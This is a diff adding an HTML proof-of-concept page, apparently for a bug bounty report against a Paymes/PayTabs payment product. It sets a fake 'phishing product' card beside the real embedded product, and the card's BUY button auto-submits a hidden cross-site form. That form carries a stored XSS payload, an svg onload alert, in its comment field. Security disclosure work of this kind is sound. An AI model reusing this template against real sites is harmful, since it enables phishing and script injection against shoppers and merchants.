@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Example Page Paytabs Product</title>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
+	<link rel="stylesheet" href="https://paymes.shop/assets/css/odeme.css" />
+	<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+	
+	<style>
+	* {
+		margin-top: 0 auto;
+		padding: 0;
+	}
+	.nav-link {
+		position: relative;
+		left: 1000px;
+	}
+	.container-fluid {
+		padding: 0%;
+		position: relative;
+	}
+	.container-fluid p {
+			position: absolute;
+		left: 20%;
+		transform: translateX(-50%);
+		top: 50px;
+	}
+	.container-fluid iframe {
+		position: absolute;
+		left: 20%;
+		transform: translateX(-50%);
+		top: 80px;
+		height: 430px;
+		width: 270px;
+	}
+	.container {
+		padding: 0%;
+		position: absolute;
+		left: 40%;
+		top: 195px;
+	}
+	button{
+		position: relative;
+		bottom: 15px;
+		border-radius: 5px;
+		width: 100%;
+		height: 45px;
+	}
+	</style>
+	</head>
+	
+	<body>
+		<nav class="navbar navbar-expand-sm bg-dark navbar-dark" style="font-family: Inter-Medium">
+			
+			<!-- Brand/logo -->
+			<a class="navbar-brand">
+				<img src="https://paymes.com/assets/img/logo2.svg" style="width: 250px; position: relative; left: 300px; top: 10px" />
+				<h5 style="position: relative; left: 750px; color: #fff">Example Of Iframe Product Manipulation</h5>
+			</a>
+
+			<!-- Links -->
+			<ul class="navbar-nav">
+				<li class="nav-item">
+					<a class="nav-link" href="#">Log In</a>
+				</li>
+				<li class="nav-item">
+					<a class="nav-link" href="#">Product</a>
+				</li>
+				<li class="nav-item">
+					<a class="nav-link" href="#">About Me</a>
+				</li>
+				<li class="nav-item">
+					<a class="nav-link" href="#">Contact Us</a>
+				</li>
+			</ul> 
+		</nav>
+
+		<div class="container-fluid">
+			<p style="font-weight: bold">Examples Of Original Product</p>
+			<iframe src="https://paymes.shop/embedv1.php?id=234272463" frameborder="0" height="430px" width="270px"></iframe>
+		</div>
+		
+		<!-- IFRAME MANIPULATION -->
+		<div class="container">
+			<p style="left: 30px; bottom: 420px; position: absolute; font-weight: bold">Examples Of Phishing Products</p>
+			<div class="card mb-4 shadow-sm" style="width: 275px; height: 410px" frameborder="0" align="middle">
+				<div class="card-header">
+					<h4 class="my-0 font-weight-normal">Bug Bounty</h4>
+				</div>
+				<div class="card-body">
+					<img src="https://cdn.paymes.shop/ae/shop/media/405e055e-ebfb-404d-bd62-495e84d4234c.jpg" height="200vh"width="200vw" />
+					<ul class="list-unstyled mt-3 mb-4">
+						<li>500.00 AED</li>
+					</ul>
+					<button id="buy-button" class="btn btn-lg btn-block btn-primary" onclick="submitForm()">BUY
+					</button>
+				</div>
+			</div>
+		</div>
+		
+		<!-- PAYLOAD -->
+		<form id="paymes-form" action="https://paymes.shop/bug-bounty-234272463?p=link" method="POST" enctype="multipart/form-data">
+			<input type="hidden" name="dialCodeCountry" value="ae" />
+			<input type="hidden" name="turr" value="0" />
+			<input type="hidden" name="email" value="zhaenx@mail.com" />
+			<input type="hidden" name="telefon" value="966455874235" />
+			<input type="hidden" name="ad" value="Bug" />
+			<input type="hidden" name="soyad" value="Bounty" />
+			<input type="hidden" name="firma_adi" value="" />
+			<input type="hidden" name="vkn" value="" />
+			<input type="hidden" name="vergi_dairesi" value="" />
+			<input type="hidden" name="adres" value="bug bounty paytabs" />
+			<input type="hidden" name="comment" value='zhaenx"><svg only=1 onload=alert(document.domain")></svg>' />
+			<!-- <input type="hidden" name="comment" value='zhaenx"><svg only=1 onload=alert(document.domain)></svg>' /> -->
+		</form>
+		<script>
+		function submitForm() {
+			document.getElementById("paymes-form").submit();
+		}
+		</script>
+		</body>
+		</html>
